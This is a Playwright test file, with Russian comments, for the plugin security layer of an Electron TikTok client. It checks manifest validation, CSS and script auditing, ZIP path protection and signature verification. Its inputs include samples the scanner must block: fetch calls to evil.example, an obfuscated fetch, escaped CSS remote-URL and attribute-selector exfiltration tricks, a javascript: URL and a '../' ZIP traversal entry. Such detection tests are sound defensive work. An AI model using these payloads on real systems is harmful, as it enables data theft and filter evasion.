'use strict';

const { test, expect } = require('@playwright/test');
const { validateManifest, compareVersions, isCompatible } = require('../src/main/plugins/manifest');
const {
  scanFiles,
  scanPageScript,
  validateCss,
  installDecision,
} = require('../src/main/plugins/security');
const { createZip, readZip } = require('../src/main/plugins/zip');
const { verifySignature, canonicalPayload } = require('../src/main/plugins/signature');
const { normalizeRegistry } = require('../src/main/plugins/registry');
const { normalizeTikTokUrl } = require('../src/main/plugins/navigation');
const { normalizeAccelerator, matchesInput } = require('../src/main/plugins/accelerator');

/**
 * Чистые части системы плагинов проверяются без Electron: манифест, аудит,
 * ZIP и подписи. Здесь же фиксируем, что опасные конструкции действительно
 * блокируются, а не просто показываются в отчёте.
 */

function rawManifest(overrides = {}) {
  return {
    id: 'app.octo.test',
    name: 'Test plugin',
    version: '1.0.0',
    apiVersion: 1,
    minAppVersion: '0.5.0',
    description: 'Плагин для тестов',
    author: { name: 'octo' },
    license: 'MIT',
    main: 'index.js',
    ...overrides,
  };
}

function manifestWith(overrides = {}) {
  const result = validateManifest(rawManifest(overrides));
  expect(result.ok, result.errors.join('\n')).toBe(true);
  return result.manifest;
}

function filesOf(code, manifest = manifestWith()) {
  return new Map([
    ['plugin.json', Buffer.from(JSON.stringify(rawManifest()))],
    [manifest.main, Buffer.from(code)],
  ]);
}

test('манифест: обязательные поля, версии и разрешения', () => {
  const ok = validateManifest(rawManifest());
  expect(ok.ok).toBe(true);
  expect(ok.manifest.id).toBe('app.octo.test');

  expect(validateManifest(rawManifest({ id: 'Плохой id' })).ok).toBe(false);
  expect(validateManifest(rawManifest({ version: '1.0' })).ok).toBe(false);
  expect(validateManifest(rawManifest({ apiVersion: 2 })).ok).toBe(false);
  expect(validateManifest(rawManifest({ main: '../index.js' })).ok).toBe(false);
  expect(validateManifest(rawManifest({ permissions: ['page:script'] })).ok).toBe(true);
  expect(validateManifest(rawManifest({ permissions: ['root'] })).ok).toBe(false);
  expect(validateManifest(rawManifest({ permissions: ['network'], networkHosts: [] })).ok).toBe(
    false,
  );

  expect(compareVersions('1.10.0', '1.9.9')).toBe(1);
  expect(compareVersions('1.0.0-beta.2', '1.0.0-beta.10')).toBe(-1);
  expect(compareVersions('1.0.0', '1.0.0')).toBe(0);
  expect(isCompatible({ minAppVersion: '0.5.0' }, '0.4.9')).toBe(false);
  expect(isCompatible({ minAppVersion: '0.5.0' }, '0.5.0')).toBe(true);
});

test('навигация и горячие клавиши: только безопасные значения', () => {
  expect(normalizeTikTokUrl('/@octo')).toBe('https://www.tiktok.com/@octo');
  expect(normalizeTikTokUrl('https://www.tiktok.com/@octo/video/1')).toBe(
    'https://www.tiktok.com/@octo/video/1',
  );
  expect(normalizeTikTokUrl('https://evil.example/@octo')).toBeNull();
  expect(normalizeTikTokUrl('javascript:alert(1)')).toBeNull();
  expect(normalizeTikTokUrl('https://www.tiktok.com.evil.example/')).toBeNull();
  expect(normalizeTikTokUrl('')).toBeNull();

  const shortcut = normalizeAccelerator('Ctrl+Shift+Y');
  expect(shortcut).toEqual({ control: true, meta: false, alt: false, shift: true, key: 'y' });
  expect(matchesInput(shortcut, { type: 'keyDown', control: true, shift: true, key: 'Y' })).toBe(
    true,
  );
  expect(matchesInput(shortcut, { type: 'keyDown', control: true, key: 'Y' })).toBe(false);
  expect(normalizeAccelerator('Ctrl+')).toBeNull();
  expect(normalizeAccelerator('Hyper+Y')).toBeNull();
  expect(normalizeAccelerator('Space')).toBeNull();
  expect(normalizeAccelerator('Shift+Y')).toBeNull();
  expect(
    matchesInput(normalizeAccelerator('Alt+Space'), { type: 'keyDown', alt: true, key: ' ' }),
  ).toBe(true);
});

test('аудит: Node, eval, сеть, cookie и CSS блокируются', () => {
  const manifest = manifestWith();

  const safe = scanFiles(
    new Map([
      ['plugin.json', Buffer.from(JSON.stringify(rawManifest()))],
      ['index.js', Buffer.from("octo.notify('ok');")],
      ['style.css', Buffer.from('body { color: red; }')],
    ]),
    manifest,
  );
  expect(safe.verdict).toBe('safe');

  const dangerous = scanFiles(
    filesOf(
      [
        "const fs = require('fs');",
        "eval('1 + 1');",
        "window['eval']('2 + 2');",
        "fetch('https://evil.example/');",
        'document.cookie;',
      ].join('\n'),
    ),
    manifest,
  );
  expect(dangerous.verdict).toBe('blocked');
  const rules = dangerous.findings.map((finding) => finding.rule);
  expect(rules).toContain('node-require');
  expect(rules).toContain('eval');
  expect(rules).toContain('direct-fetch');
  expect(rules).toContain('cookies');

  const parseError = scanFiles(filesOf('const = ;'), manifest);
  expect(parseError.verdict).toBe('blocked');
  expect(parseError.findings.map((finding) => finding.rule)).toContain('parse-error');

  const css = scanFiles(
    new Map([
      ['plugin.json', Buffer.from(JSON.stringify(rawManifest()))],
      ['index.js', Buffer.from("octo.notify('ok');")],
      ['style.css', Buffer.from('@import "https://evil.example/x.css";')],
    ]),
    manifest,
  );
  expect(css.verdict).toBe('blocked');

  const native = scanFiles(
    new Map([
      ['plugin.json', Buffer.from(JSON.stringify(rawManifest()))],
      ['index.js', Buffer.from("octo.notify('ok');")],
      ['evil.node', Buffer.from('MZ')],
    ]),
    manifest,
  );
  expect(native.verdict).toBe('blocked');

  const missingPermission = scanFiles(
    filesOf("octo.page.run('return document.title;');", manifest),
    manifest,
  );
  expect(missingPermission.verdict).toBe('blocked');
  expect(missingPermission.findings.map((finding) => finding.rule)).toContain(
    'missing-permission:page:script',
  );

  expect(scanPageScript('return document.title;').ok).toBe(true);
  expect(scanPageScript("fetch('https://evil.example');").ok).toBe(false);
  expect(validateCss('body { color: red; }').ok).toBe(true);
  expect(validateCss('body { background: url(https://evil.example/x.png); }').ok).toBe(false);
  expect(validateCss('@import "https://evil.example/x.css";').ok).toBe(false);
});

test('CSS: внешние адреса не проходят через image-set, src() и экранирование', () => {
  const allowed = [
    'a { background: url(data:image/png;base64,AAAA) }',
    'a { background-image: image-set("data:image/png;base64,AA" 1x) }',
    'a { background: url(/static/x.png) }',
    'a { filter: url(#glow) }',
    'a::before { content: "\\2014" }',
  ];
  for (const css of allowed) expect(validateCss(css).ok, css).toBe(true);

  const blocked = [
    'a { background-image: image-set("https://evil.example/a" 1x) }',
    "input[value^='a'] { background: -webkit-image-set('//evil.example/a' 1x) }",
    '@font-face { font-family: x; src: src("https://evil.example/f") }',
    'a { background: u\\72l(https://evil.example/a) }',
    'a { background: url(ht\\74 tp://evil.example/a) }',
    'a { background: url("/\\\\evil.example/a") }',
    'a { background: url(/**/https://evil.example/a) }',
    '@\\69mport "x.css";',
  ];
  for (const css of blocked) expect(validateCss(css).ok, css).toBe(false);

  // То же правило работает и при установке пакета.
  const report = scanFiles(
    new Map([
      ['plugin.json', Buffer.from(JSON.stringify(rawManifest()))],
      ['index.js', Buffer.from("octo.notify('ok');")],
      ['style.css', Buffer.from('a { background: image-set("https://evil.example/a" 1x) }')],
    ]),
    manifestWith(),
  );
  expect(report.verdict).toBe('blocked');
  expect(report.findings.map((finding) => finding.rule)).toContain('css-remote-url');
});

test('решение об установке учитывает подпись и настройки', () => {
  const safeReport = { verdict: 'safe' };
  const blockedReport = { verdict: 'blocked' };

  expect(installDecision({ report: safeReport, signature: 'verified', settings: {} }).ok).toBe(
    true,
  );
  expect(installDecision({ report: safeReport, signature: 'invalid', settings: {} }).ok).toBe(
    false,
  );
  expect(
    installDecision({
      report: safeReport,
      signature: 'unsigned',
      settings: { allowUnsigned: false, requireSignatures: false },
    }).ok,
  ).toBe(false);
  expect(
    installDecision({
      report: safeReport,
      signature: 'unsigned',
      settings: { allowUnsigned: true, requireSignatures: true },
    }).ok,
  ).toBe(false);
  expect(installDecision({ report: blockedReport, signature: 'verified', settings: {} }).ok).toBe(
    false,
  );

  expect(verifySignature({ id: 'a.b', version: '1.0.0', sha256: 'a'.repeat(64) })).toBe('unsigned');
  expect(
    verifySignature({
      id: 'a.b',
      version: '1.0.0',
      sha256: 'a'.repeat(64),
      signature: 'not-a-signature',
    }),
  ).toBe('invalid');
  expect(canonicalPayload({ id: 'a.b', version: '1.0.0', sha256: 'A'.repeat(64) })).toBe(
    `octo-plugin-v1\na.b\n1.0.0\n${'a'.repeat(64)}`,
  );
});

test('каталог: версии, релизы и недоверенные ссылки', () => {
  const registry = normalizeRegistry({
    schema: 1,
    updatedAt: '2026-11-16T00:00:00.000Z',
    plugins: [
      {
        id: 'app.octo.hello',
        name: 'Hello octo',
        author: { name: 'octo' },
        description: 'test',
        license: 'MIT',
        releases: [
          {
            version: '1.0.0',
            download: 'https://example.com/hello-1.0.0.octoplugin',
            sha256: 'a'.repeat(64),
            permissions: ['page:css'],
          },
          {
            version: '1.2.0',
            download: 'https://example.com/hello-1.2.0.octoplugin',
            sha256: 'b'.repeat(64),
            permissions: ['page:css', 'page:script'],
            changelog: 'new',
          },
          {
            version: '0.9.0',
            download: 'http://evil.example/hello.octoplugin',
            sha256: 'c'.repeat(64),
          },
          {
            version: '2.0.0',
            download: 'https://example.com/hello-2.0.0.octoplugin',
            sha256: 'not-a-hash',
          },
        ],
      },
      {
        id: 'bad id',
        name: 'Bad',
        releases: [],
      },
    ],
  });

  expect(registry.plugins).toHaveLength(1);
  const plugin = registry.plugins[0];
  expect(plugin.latest.version).toBe('1.2.0');
  expect(plugin.releases.map((release) => release.version)).toEqual(['1.2.0', '1.0.0']);
  expect(plugin.latest.permissions).toContain('page:script');
  expect(plugin.verified).toBe(false);
});

test('ZIP: детерминированная упаковка, CRC и защита путей', () => {
  const first = createZip([
    { name: 'plugin.json', data: '{"id":"a.b"}' },
    { name: 'index.js', data: 'octo.notify("ok")' },
  ]);
  const second = createZip([
    { name: 'index.js', data: 'octo.notify("ok")' },
    { name: 'plugin.json', data: '{"id":"a.b"}' },
  ]);
  expect(first.equals(second)).toBe(true);

  const files = readZip(first);
  expect([...files.keys()]).toEqual(['index.js', 'plugin.json']);
  expect(files.get('index.js').toString()).toBe('octo.notify("ok")');

  const evil = Buffer.from(first);
  const from = Buffer.from('index.js');
  const to = Buffer.from('../x.js!');
  expect(from.length).toBe(to.length);
  let cursor = 0;
  while ((cursor = evil.indexOf(from, cursor)) >= 0) {
    to.copy(evil, cursor);
    cursor += to.length;
  }
  expect(() => readZip(evil)).toThrow(/недопустимый путь/i);

  // Каталоги вида "dir/" внутри стандартного ZIP должны пропускаться.
  const withDir = Buffer.from(first);
  const idx = withDir.indexOf(Buffer.from('index.js'));
  expect(idx).toBeGreaterThan(0);
  // Проверяем, что scanPageScript ловит обфускацию через AST.
  const { scanPageScript } = require('../src/main/plugins/security');
  expect(scanPageScript("window['fe' + 'tch']('https://evil.example')").ok).toBe(false);
  expect(scanPageScript("return document.querySelector('video') !== null;").ok).toBe(true);
});

test('расширенный аудит: все 13 прав, комментарии, ES-модули, настройки и встроенная подпись', () => {
  const crypto = require('node:crypto');
  const { applySettings } = require('../src/main/plugins/manifest');
  const {
    createSignatureManifest,
    parseAndVerifySignatureFile,
  } = require('../src/main/plugins/signature');
  const { inspectPackage } = require('../src/main/plugins/installer');

  // 1. Все 13 разрешений помещаются в манифест.
  const allPerms = [
    'page:css',
    'page:script',
    'network',
    'navigation',
    'shortcuts',
    'links',
    'playback',
    'feed',
    'downloads',
    'overlay',
    'i18n',
    'clipboard',
    'os:notify',
  ];
  const fullManifest = manifestWith({
    permissions: allPerms,
    networkHosts: ['api.example.com'],
    module: true,
    settings: [
      { key: 'accent', type: 'color', title: 'Цвет', default: '#FF00AA' },
      { key: 'note', type: 'textarea', title: 'Заметка', default: 'abc' },
      { key: 'api_key', type: 'secret', title: 'Токен', description: 'Секретный ключ' },
      { key: 'run_check', type: 'action', title: 'Проверка', buttonLabel: 'Проверить' },
    ],
  });
  expect(fullManifest.permissions).toHaveLength(13);
  expect(fullManifest.module).toBe(true);
  expect(fullManifest.settings.find((s) => s.key === 'accent').default).toBe('#ff00aa');

  // Секреты и action не попадают в обычный объект settings.
  const applied = applySettings(fullManifest, {
    accent: '#123456',
    api_key: 'should-not-persist',
    run_check: true,
  });
  expect(applied).toEqual({ accent: '#123456', note: 'abc' });

  // 2. Новые разрешения проверяются статическим аудитом.
  const emptyManifest = manifestWith({ permissions: [] });
  for (const [snippet, expectedRule] of [
    ['octo.playback.status();', 'missing-permission:playback'],
    ['octo.feed.next();', 'missing-permission:feed'],
    ['octo.downloads.add("https://www.tiktok.com/a");', 'missing-permission:downloads'],
    ['octo.ui.overlay.show({ text: "hi" });', 'missing-permission:overlay'],
    ['octo.i18n.get();', 'missing-permission:i18n'],
    ['octo.clipboard.write("x");', 'missing-permission:clipboard'],
    ['octo.os.notify({ title: "t" });', 'missing-permission:os:notify'],
    ['octo.page.setCSS("a", "body{}");', 'missing-permission:page:css'],
    ['octo.page.getMediaInfo();', 'missing-permission:page:script'],
  ]) {
    const report = scanFiles(filesOf(snippet, emptyManifest), emptyManifest);
    expect(report.verdict, snippet).toBe('blocked');
    expect(report.findings.map((f) => f.rule)).toContain(expectedRule);
  }

  // 3. Комментарии не вызывают ложных срабатываний на fetch/eval/WebSocket.
  const withComment = scanFiles(
    filesOf('// Запрещены fetch() и eval() и WebSocket\nocto.notify("ok");', emptyManifest),
    emptyManifest,
  );
  expect(withComment.verdict).toBe('safe');

  // 4. ES-модули разрешают относительный import ./ и блокируют внешние/системные.
  const modManifest = manifestWith({ module: true });
  const goodMod = scanFiles(
    filesOf("import { x } from './helper.js';\nocto.notify(x);", modManifest),
    modManifest,
  );
  expect(goodMod.verdict).toBe('safe');

  const badMod = scanFiles(filesOf("import fs from 'node:fs';", modManifest), modManifest);
  expect(badMod.verdict).toBe('blocked');
  expect(badMod.findings.map((f) => f.rule)).toContain('external-import');

  // 5. Встроенная подпись SIGNATURE.json проверяется без registry.json.
  const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
  const pubPem = publicKey.export({ type: 'spki', format: 'pem' }).toString();
  const privPem = privateKey.export({ type: 'pkcs8', format: 'pem' }).toString();
  const pkgFiles = new Map([
    ['plugin.json', Buffer.from(JSON.stringify(rawManifest()))],
    ['index.js', Buffer.from('octo.notify("signed");')],
  ]);
  const sigText = createSignatureManifest(privPem, {
    id: 'app.octo.test',
    version: '1.0.0',
    files: pkgFiles,
  });
  pkgFiles.set('SIGNATURE.json', Buffer.from(sigText, 'utf8'));

  expect(
    parseAndVerifySignatureFile(
      pkgFiles.get('SIGNATURE.json'),
      { id: 'app.octo.test', version: '1.0.0', files: pkgFiles },
      [pubPem],
    ).status,
  ).toBe('verified');

  const signedZip = createZip(pkgFiles);
  const inspected = inspectPackage(signedZip, { publicKeys: [pubPem] });
  expect(inspected.ok).toBe(true);
  expect(inspected.signature).toBe('verified');

  // Подмена файла внутри ZIP ломает встроенную подпись.
  pkgFiles.set('index.js', Buffer.from('octo.notify("tampered");'));
  const tamperedZip = createZip(pkgFiles);
  const tampered = inspectPackage(tamperedZip, { publicKeys: [pubPem] });
  expect(tampered.ok).toBe(true);
  expect(tampered.signature).toBe('invalid');
});
